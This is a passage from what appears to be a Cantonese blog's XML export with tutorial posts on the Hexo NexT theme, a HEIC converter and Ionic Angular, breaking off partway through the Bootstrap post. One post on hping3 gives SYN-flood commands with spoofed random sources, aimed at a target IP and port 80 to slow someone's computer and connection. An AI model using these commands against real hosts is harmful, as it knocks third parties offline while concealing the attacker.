<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/next-theme/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>

<h1 id="修改-config-yml"><a href="#修改-config-yml" class="headerlink" title="修改 _config.yml"></a>修改 <code>_config.yml</code></h1><p>拉到最底搵 <code>theme:</code></p>
<p>將佢改做</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Next Themes</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>網站</tag>
        <tag>Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>Hping3 - 指令化 DoS 工具</title>
    <url>/2022/01/07/hping3-command/</url>
    <content><![CDATA[<img src="hping3-logo.svg" width="200px"/>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>hping3 是一款網路工具，可自定義TCP/IP封包並顯示回應，用於網路、連接埠、協定、作業系統、服務類型掃描。</p>
<h1 id="下載-hping3"><a href="#下載-hping3" class="headerlink" title="下載 hping3"></a>下載 hping3</h1><p>玩這些的工具我也會建議使用 Linux 系統，我以 <code>apt-get package manager</code> 做下載示範，只需輸入以下指令就可以了。</p>
<ul>
<li><code>-y</code> : 解釋為自動輸入 <code>yes</code>，因為 <code>apt-get</code> 會問你是否下載，這樣打了 <code>-y</code> 就可以節省你的時間。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install hping3 -y</span><br></pre></td></tr></table></figure>

<h1 id="參數"><a href="#參數" class="headerlink" title="參數"></a>參數</h1><ul>
<li><code>-c</code>：-發送封包數量</li>
<li><code>-d</code>：封包大小</li>
<li><code>-S</code>：發送 SYN 封包</li>
<li><code>-w</code>：TCP window 大小</li>
<li><code>-p</code>：目標端口，可以指定任意埠</li>
<li><code>–flood</code>：快的發送封包</li>
<li><code>–rand-source</code>：隱藏來源位置 (隨機產生)</li>
</ul>
<h1 id="SYN-Flooding"><a href="#SYN-Flooding" class="headerlink" title="SYN Flooding"></a>SYN Flooding</h1><blockquote>
<p>說明 : SYN洪水，一種阻斷服務攻擊</p>
</blockquote>
<h2 id="功擊主機-IP"><a href="#功擊主機-IP" class="headerlink" title="功擊主機 IP"></a>功擊主機 IP</h2><blockquote>
<p>注意 : 請小心使用，被找到可能造成法律問題。</p>
</blockquote>
<h3 id="堵塞-CPU-中央處理器"><a href="#堵塞-CPU-中央處理器" class="headerlink" title="堵塞 CPU 中央處理器"></a>堵塞 CPU 中央處理器</h3><p>此方法會將流量塞入本機 IP 內的 CPU 中央處理器，令他電腦卡卡的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hping3 [target ip] --flood --rand-source</span><br></pre></td></tr></table></figure>

<h3 id="堵塞上網速度"><a href="#堵塞上網速度" class="headerlink" title="堵塞上網速度"></a>堵塞上網速度</h3><p>此方法會將流量塞入本機 IP 的上網服務 (80 端口)，從而令到他的上網速度更慢。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hping3 [target ip] --flood --rand-source -p 80</span><br></pre></td></tr></table></figure>

<p>參考資料 :<br><a href="https://sectools.tw/hping3/">https://sectools.tw/hping3/</a><br><a href="https://www.kali.org/tools/hping3/">https://www.kali.org/tools/hping3/</a><br><a href="https://blog.xuite.net/towns/hc/329637084">https://blog.xuite.net/towns/hc/329637084</a></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>iMazing HEIC Converter - 圖片格式轉換器</title>
    <url>/2022/05/23/iMazing-HEIC-Converter-Apps/</url>
    <content><![CDATA[<p align="center">
    <img alt="iMazing HEIC Converter" src="cover.svg" width="200px"/>
    <h1 align="center">iMazing HEIC Converter</h1>
</p>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>當你想將圖片檔案移動去其他系統，<br>但發現所有圖片檔案都是 heic 格式，<br>heic 是 Apple圖片檔案，其他系統開啟的話會格式不相容。</p>
<p>所以這款程式是用來轉換檔案用的，<br>轉換後問題就解決了，<br>可以開啟圖片檔案。</p>
<h1 id="特徵"><a href="#特徵" class="headerlink" title="特徵"></a>特徵</h1><ul>
<li>將 HEIC 轉換為 JPG,PNG</li>
<li>保留 EXIF 元數據</li>
<li>支持顏色配置文件，包括廣色域</li>
<li>100% 免費</li>
</ul>
<h2 id="程式"><a href="#程式" class="headerlink" title="程式"></a>程式</h2><img src="/2022/05/23/iMazing-HEIC-Converter-Apps/program.gif" class="">
<img src="/2022/05/23/iMazing-HEIC-Converter-Apps/program%202.png" class="">

<h2 id="官網"><a href="#官網" class="headerlink" title="官網"></a>官網</h2><p><a href="https://imazing.com/">https://imazing.com/</a></p>
<h2 id="下載"><a href="#下載" class="headerlink" title="下載"></a>下載</h2><p><a href="https://imazing.com/download">https://imazing.com/download</a></p>
]]></content>
      <categories>
        <category>MacOS</category>
      </categories>
      <tags>
        <tag>程式</tag>
      </tags>
  </entry>
  <entry>
    <title>Ionic Angular - 新增屋企 button</title>
    <url>/2022/02/13/ionic-Angular-add-icon-click-to-home/</url>
    <content><![CDATA[<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><p>喺你個頁既 <code>html</code> 將</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ion-header</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">ion-header</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>包住既野改成咁</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ion-header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ion-toolbar</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ion-buttons</span> <span class="attr">slot</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ion-back-button</span> <span class="attr">text</span>=<span class="string">&quot;Contact&quot;</span> <span class="attr">icon</span>=<span class="string">&quot;call-outline&quot;</span> <span class="attr">defaultHref</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ion-back-button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ion-buttons</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ion-toolbar</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ion-header</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="解釋"><a href="#解釋" class="headerlink" title="解釋"></a>解釋</h2><h3 id="顯示左邊-start"><a href="#顯示左邊-start" class="headerlink" title="顯示左邊 start"></a>顯示左邊 start</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">start 係左邊</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ion-buttons</span> <span class="attr">slot</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2022/02/13/ionic-Angular-add-icon-click-to-home/left.png" class="">


<h3 id="顯示右邊-left"><a href="#顯示右邊-left" class="headerlink" title="顯示右邊 left"></a>顯示右邊 left</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">end 係右邊</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ion-buttons</span> <span class="attr">slot</span>=<span class="string">&quot;end&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2022/02/13/ionic-Angular-add-icon-click-to-home/right.png" class="">

<h3 id="ion-back-button"><a href="#ion-back-button" class="headerlink" title="ion-back-button"></a>ion-back-button</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">text=&quot;&quot; 係顯示既字</span></span><br><span class="line"><span class="comment">icon=&quot;&quot; 根據返 https://ionic.io/ionicons 既 icon =&quot;&quot;</span></span><br><span class="line"><span class="comment">defaultHref=&quot;&quot; 係撳左會去邊既位置</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ion-back-button</span> <span class="attr">text</span>=<span class="string">&quot;Contact&quot;</span> <span class="attr">icon</span>=<span class="string">&quot;call-outline&quot;</span> <span class="attr">defaultHref</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ionic</category>
      </categories>
      <tags>
        <tag>Apps</tag>
        <tag>Framework</tag>
        <tag>Angular</tag>
      </tags>
  </entry>
  <entry>
    <title>Ionic Angular - 新增頁面</title>
    <url>/2022/02/10/ionic-Angular-add-page/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>當你想新增喺下面既 page 既時候，<br>我地係需要用到指令去 gen 一個 page，<br>然後再修改 ts 檔，再修改 html 檔<br>咁點做呢？</p>
<p>以下我會示範點做。</p>
<h2 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h2><p>首先我地 cd 入到去你既 ionic project</p>
<h3 id="指令新增-Page"><a href="#指令新增-Page" class="headerlink" title="指令新增 Page"></a>指令新增 Page</h3><p>然後打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ionic generate page contact</span><br></pre></td></tr></table></figure>

<p>或者再簡化啲咁打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ionic g page contact</span><br></pre></td></tr></table></figure>

<ul>
<li>contact 係你想要既名 (我用 contact 做例子，當然你可以打其他)</li>
</ul>
<img src="/2022/02/10/ionic-Angular-add-page/addd.png" class="">

<h3 id="修改-Typescript"><a href="#修改-Typescript" class="headerlink" title="修改 Typescript"></a>修改 Typescript</h3><p>你會見到多左個 <code>src/app/contact/</code></p>
<img src="/2022/02/10/ionic-Angular-add-page/confirm-contact-add.png" class="">

<p>我地再去 <code>src\app\tabs\tabs-routing.module.ts</code></p>
<p>由原本既 3 個</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;tab1&#x27;</span>,</span><br><span class="line">    <span class="attr">loadChildren</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../tab1/tab1.module&#x27;</span>).then(<span class="function"><span class="params">m</span> =&gt;</span> m.Tab1PageModule)</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;tab2&#x27;</span>,</span><br><span class="line">    <span class="attr">loadChildren</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../tab2/tab2.module&#x27;</span>).then(<span class="function"><span class="params">m</span> =&gt;</span> m.Tab2PageModule)</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;tab3&#x27;</span>,</span><br><span class="line">    <span class="attr">loadChildren</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../tab3/tab3.module&#x27;</span>).then(<span class="function"><span class="params">m</span> =&gt;</span> m.Tab3PageModule)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>改成咁，<br>留意返要有 <code>,</code></p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;tab1&#x27;</span>,</span><br><span class="line">    <span class="attr">loadChildren</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../tab1/tab1.module&#x27;</span>).then(<span class="function"><span class="params">m</span> =&gt;</span> m.Tab1PageModule)</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;tab2&#x27;</span>,</span><br><span class="line">    <span class="attr">loadChildren</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../tab2/tab2.module&#x27;</span>).then(<span class="function"><span class="params">m</span> =&gt;</span> m.Tab2PageModule)</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;tab3&#x27;</span>,</span><br><span class="line">    <span class="attr">loadChildren</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../tab3/tab3.module&#x27;</span>).then(<span class="function"><span class="params">m</span> =&gt;</span> m.Tab3PageModule)</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;contact&#x27;</span>,</span><br><span class="line">    <span class="attr">loadChildren</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../contact/contact.module&#x27;</span>).then(<span class="function"><span class="params">m</span> =&gt;</span> m.ContactPageModule)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>呢度入面要改 3樣野，要留意有冇改錯，<br>但如果你改錯左佢會紅色底線，<br>所以都唔太擔心既 ~</p>
<p>要改 <code>contact</code>，<code>contact.module</code>，<code>m.ContactPageMoudle</code></p>
<p>基本上要留意既就係 最後個抽 <code>m.ContactPageMoudle</code>，<br>其他個兩個都係跟返你岩岩指令打左個隻字係乜就改乜<br>至於最後個名係乜 就睇返呢度 <code>src\app\contact\contact.module.ts</code></p>
<p>開左黎睇佢既 full code 係咁樣</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; NgModule &#125; <span class="keyword">from</span> <span class="string">&#x27;@angular/core&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; CommonModule &#125; <span class="keyword">from</span> <span class="string">&#x27;@angular/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; FormsModule &#125; <span class="keyword">from</span> <span class="string">&#x27;@angular/forms&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; IonicModule &#125; <span class="keyword">from</span> <span class="string">&#x27;@ionic/angular&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; ContactPageRoutingModule &#125; <span class="keyword">from</span> <span class="string">&#x27;./contact-routing.module&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; ContactPage &#125; <span class="keyword">from</span> <span class="string">&#x27;./contact.page&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@NgModule</span>(&#123;</span><br><span class="line">  <span class="attr">imports</span>: [</span><br><span class="line">    CommonModule,</span><br><span class="line">    FormsModule,</span><br><span class="line">    IonicModule,</span><br><span class="line">    ContactPageRoutingModule</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">declarations</span>: [ContactPage]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">ContactPageModule</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>最下面個行，<br>你會見到</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">ContactPageModule</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>要改既名就係 <code>ContactPageModule</code></p>
<p>成句就係咁樣。</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">loadChildren: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../contact/contact.module&#x27;</span>).then(<span class="function"><span class="params">m</span> =&gt;</span> m.ContactPageModule)</span><br></pre></td></tr></table></figure>

<h3 id="修改-html"><a href="#修改-html" class="headerlink" title="修改 html"></a>修改 html</h3><p>去 <code>src\app\tabs\tabs.page.html</code></p>
<p>你會見到呢堆 code</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ion-tabs</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">ion-tab-bar</span> <span class="attr">slot</span>=<span class="string">&quot;bottom&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ion-tab-button</span> <span class="attr">tab</span>=<span class="string">&quot;tab1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ion-icon</span> <span class="attr">name</span>=<span class="string">&quot;triangle&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ion-icon</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ion-label</span>&gt;</span>Tab 1<span class="tag">&lt;/<span class="name">ion-label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ion-tab-button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ion-tab-button</span> <span class="attr">tab</span>=<span class="string">&quot;tab2&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ion-icon</span> <span class="attr">name</span>=<span class="string">&quot;ellipse&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ion-icon</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ion-label</span>&gt;</span>Tab 2<span class="tag">&lt;/<span class="name">ion-label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ion-tab-button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ion-tab-button</span> <span class="attr">tab</span>=<span class="string">&quot;tab3&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ion-icon</span> <span class="attr">name</span>=<span class="string">&quot;square&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ion-icon</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ion-label</span>&gt;</span>Tab 3<span class="tag">&lt;/<span class="name">ion-label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ion-tab-button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ion-tab-bar</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">ion-tabs</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我地同上面一樣，都係要加野。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ion-tab-button</span> <span class="attr">tab</span>=<span class="string">&quot;contact&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ion-icon</span> <span class="attr">name</span>=<span class="string">&quot;square&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ion-icon</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ion-label</span>&gt;</span>Contact<span class="tag">&lt;/<span class="name">ion-label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ion-tab-button</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>完整 code 就係咁</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ion-tabs</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">ion-tab-bar</span> <span class="attr">slot</span>=<span class="string">&quot;bottom&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ion-tab-button</span> <span class="attr">tab</span>=<span class="string">&quot;tab1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ion-icon</span> <span class="attr">name</span>=<span class="string">&quot;triangle&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ion-icon</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ion-label</span>&gt;</span>Tab 1<span class="tag">&lt;/<span class="name">ion-label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ion-tab-button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ion-tab-button</span> <span class="attr">tab</span>=<span class="string">&quot;tab2&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ion-icon</span> <span class="attr">name</span>=<span class="string">&quot;ellipse&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ion-icon</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ion-label</span>&gt;</span>Tab 2<span class="tag">&lt;/<span class="name">ion-label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ion-tab-button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ion-tab-button</span> <span class="attr">tab</span>=<span class="string">&quot;tab3&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ion-icon</span> <span class="attr">name</span>=<span class="string">&quot;square&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ion-icon</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ion-label</span>&gt;</span>Tab 3<span class="tag">&lt;/<span class="name">ion-label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ion-tab-button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ion-tab-button</span> <span class="attr">tab</span>=<span class="string">&quot;contact&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ion-icon</span> <span class="attr">name</span>=<span class="string">&quot;square&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ion-icon</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ion-label</span>&gt;</span>Contact<span class="tag">&lt;/<span class="name">ion-label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ion-tab-button</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">ion-tab-bar</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">ion-tabs</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2022/02/10/ionic-Angular-add-page/contact-page-html.png" class="">

<p>成功 ~</p>
<h4 id="簡短咁講下"><a href="#簡短咁講下" class="headerlink" title="簡短咁講下"></a>簡短咁講下</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">呢句係改個 icon 既圖，</span></span><br><span class="line"><span class="comment">至於搵圖就喺呢度搵 https://ionic.io/ionicons</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">要改既只係 name=&quot;&quot; 入面既字</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ion-icon</span> <span class="attr">name</span>=<span class="string">&quot;square&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ion-icon</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">呢句就係會顯示既名稱。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">要改既只係包住入面既字。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ion-label</span>&gt;</span>Contact<span class="tag">&lt;/<span class="name">ion-label</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h2><p>要做 三樣野。</p>
<h4 id="第一樣"><a href="#第一樣" class="headerlink" title="第一樣"></a>第一樣</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ionic g page contact # 加 page</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者</span></span><br><span class="line">ionic generate page contact</span><br></pre></td></tr></table></figure>

<h4 id="第二樣"><a href="#第二樣" class="headerlink" title="第二樣"></a>第二樣</h4><p>去 <code>src\app\tabs\tabs-routing.module.ts</code> 加野</p>
<h4 id="第三樣"><a href="#第三樣" class="headerlink" title="第三樣"></a>第三樣</h4><p>去 <code>src\app\tabs\tabs.page.html</code> 加野</p>
<p>搞撚掂。</p>
<p>參考資料<br><a href="https://ionicframework.com/docs/cli/commands/generate">https://ionicframework.com/docs/cli/commands/generate</a></p>
]]></content>
      <categories>
        <category>ionic</category>
      </categories>
      <tags>
        <tag>Apps</tag>
        <tag>Framework</tag>
        <tag>Angular</tag>
      </tags>
  </entry>
  <entry>
    <title>Ionic Angular - 使用 Bootstrap CSS Framework</title>
    <url>/2022/02/13/ionic-Angular-bootstrap-add/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>喺設計上，想更加靚，<br>可以考慮用 CSS Framework，<br>而今篇文，<br>就係教你點加 <a href="https://getbootstrap.com/">Bootstrap</a> 入去你既 ionic Project。</p>
<h2 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h2><h3 id="安裝-Bootstrap"><a href="#安裝-Bootstrap" class="headerlink" title="安裝 Bootstrap"></a>安裝 Bootstrap</h3><p>cd 入你既 ionic proeject。<br>再打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install bootstrap</span><br></pre></td></tr></table></figure>

<p>然後你會見到你既 project 入面既 <code>node_modules</code>，<br>多左個叫 <code>bootstrap</code> 既 Folder。</p>
<p>我地需要 <code>bootstrap.min</code> 呢個 Paths，<br>抄底呢個 files 既 paths 先，<br>轉頭我地會加野喺 <code>angular.json</code> 度加上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node_modules\bootstrap\dist\css\bootstrap.min.css</span><br></pre></td></tr></table></figure>

<h3 id="修改-json"><a href="#修改-json" class="headerlink" title="修改 json"></a>修改 <code>json</code></h3><p>而加我地需要入去 <code>angular.json</code> 加野。<br>喺最近 <code>styles</code> 個行入面，</p>
<p>由原本既咁樣</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;styles&quot;</span>: [<span class="string">&quot;src/theme/variables.scss&quot;</span>, <span class="string">&quot;src/global.scss&quot;</span>],</span><br><span class="line"><span class="string">&quot;scripts&quot;</span>: [],</span><br><span class="line"><span class="string">&quot;aot&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">&quot;vendorChunk&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;extractLicenses&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">&quot;buildOptimizer&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">&quot;sourceMap&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;optimization&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">&quot;namedChunks&quot;</span>: <span class="literal">true</span> </span><br></pre></td></tr></table></figure>
<p>大概係 34 行左右，加樣野</p>
<p>改做咁樣</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;styles&quot;</span>: [<span class="string">&quot;src/theme/variables.scss&quot;</span>, <span class="string">&quot;src/global.scss&quot;</span> ,<span class="string">&quot;node_modules/bootstrap/dist/css/bootstrap.min.css&quot;</span>],</span><br><span class="line"><span class="string">&quot;scripts&quot;</span>: [],</span><br><span class="line"><span class="string">&quot;aot&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">&quot;vendorChunk&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;extractLicenses&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">&quot;buildOptimizer&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">&quot;sourceMap&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;optimization&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">&quot;namedChunks&quot;</span>: <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>留意返我地既 paths 要打 <code>/</code> 而唔係打 <code>\</code>，<br>加 <code>, &quot;node_modules/bootstrap/dist/css/bootstrap.min.css&quot;</code></p>
<h3 id="重啟-Server"><a href="#重啟-Server" class="headerlink" title="重啟 Server"></a>重啟 Server</h3><p>然後我地重開 Server</p>
<h3 id="測試新增內容"><a href="#測試新增內容" class="headerlink" title="測試新增內容"></a>測試新增內容</h3><p>我地再喺其中一個 <code>html</code> 加野，<br>我以 contact page 做示範</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">src\app\contact\contact.page.html</span><br></pre></td></tr></table></figure>

<p>我是但打啲野試下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;alert alert-success&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">strong</span>&gt;</span>示範用 alert.<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>完整 code</p>
